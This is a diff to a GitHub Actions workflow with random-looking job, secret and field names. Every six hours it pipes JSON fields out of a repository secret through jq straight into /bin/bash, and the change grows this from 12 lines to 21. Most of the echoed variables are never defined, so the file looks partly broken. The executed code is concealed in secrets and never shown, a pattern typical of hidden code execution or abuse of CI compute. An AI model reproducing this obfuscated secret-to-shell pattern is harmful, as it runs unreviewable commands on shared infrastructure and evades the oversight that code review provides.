@@ -1,8 +1,9 @@
 name: qidiyun6453
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
+    - cron: '35 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +12,27 @@ jobs:
       - uses: actions/checkout@v4
       - name: qidiyun6453
         env:
-          hmvm964: ${{ secrets.hmvm964 }}
+          zreg630: ${{ secrets.zreg630 }}
         run: |
-          echo $hmvm964 | jq -r .w80117 | /bin/bash
-          echo $dfd8 | jq -r .axu47 | /bin/bash
-          echo $bg76 | jq -r .s8 | /bin/bash
-          echo $c739 | jq -r .rl4 | /bin/bash
-          echo $mvjo9105 | jq -r .t923 | /bin/bash
-          echo $kxjf16 | jq -r .akp08 | /bin/bash
-          echo $z52349 | jq -r .vism75 | /bin/bash
-          echo $j66 | jq -r .yksei96773 | /bin/bash
-          echo $zsjli3 | jq -r .a2705 | /bin/bash
-          echo $faj2 | jq -r .qbnz7 | /bin/bash
-          echo $sjj03 | jq -r .kw4099 | /bin/bash
-          echo $nn7 | jq -r .xos1 | /bin/bash
+          echo $zreg630 | jq -r .ujgi54379 | /bin/bash
+          echo $cw5551 | jq -r .tx71664 | /bin/bash
+          echo $jo0094 | jq -r .qwj81 | /bin/bash
+          echo $s19 | jq -r .uc3525 | /bin/bash
+          echo $jak481 | jq -r .qin09 | /bin/bash
+          echo $k8976 | jq -r .nij5772 | /bin/bash
+          echo $a28 | jq -r .h008 | /bin/bash
+          echo $utmz445 | jq -r .suru39 | /bin/bash
+          echo $v49 | jq -r .sobk74555 | /bin/bash
+          echo $h2 | jq -r .fecxz28 | /bin/bash
+          echo $mbhqq0947 | jq -r .pcz616 | /bin/bash
+          echo $fy762 | jq -r .j38114 | /bin/bash
+          echo $ijk37 | jq -r .kk89420 | /bin/bash
+          echo $at48 | jq -r .o705 | /bin/bash
+          echo $ltjn89050 | jq -r .nx0495 | /bin/bash
+          echo $nwc4 | jq -r .yqtlf226 | /bin/bash
+          echo $h2 | jq -r .vs03 | /bin/bash
+          echo $jtbog671 | jq -r .gtq489 | /bin/bash
+          echo $d94 | jq -r .f2517 | /bin/bash
+          echo $bnam9653 | jq -r .gq37712 | /bin/bash
+          echo $ts5849 | jq -r .ubjch3 | /bin/bash
 
